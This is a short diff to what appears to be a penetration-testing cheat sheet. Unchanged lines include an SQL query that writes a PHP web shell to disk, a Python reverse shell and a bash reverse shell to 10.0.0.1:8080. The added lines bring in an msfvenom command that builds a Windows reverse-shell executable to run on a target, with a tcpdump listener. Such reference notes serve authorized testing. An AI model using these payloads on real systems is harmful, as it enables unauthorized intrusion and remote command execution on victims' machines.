@@ -25,6 +25,8 @@ SELECT '<?php passthru($_GET[cmd]);?>' INTO OUTFILE '<file_location>/<filename>'
 
 ## Reverse Shell
 
+
+
 ### Python
 
 ```sh
@@ -37,6 +39,16 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 
 ```bash
 bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+```
+
+### Check output FW
+
+```bash
+# Generate and execute on target
+msfvenom -p windows/shell/reverse_tcp_allports -f exe > test_firewall.exe
+
+# Listen for incoming traffic
+tcpdump -ni any host <target>
 ```
 
 ---
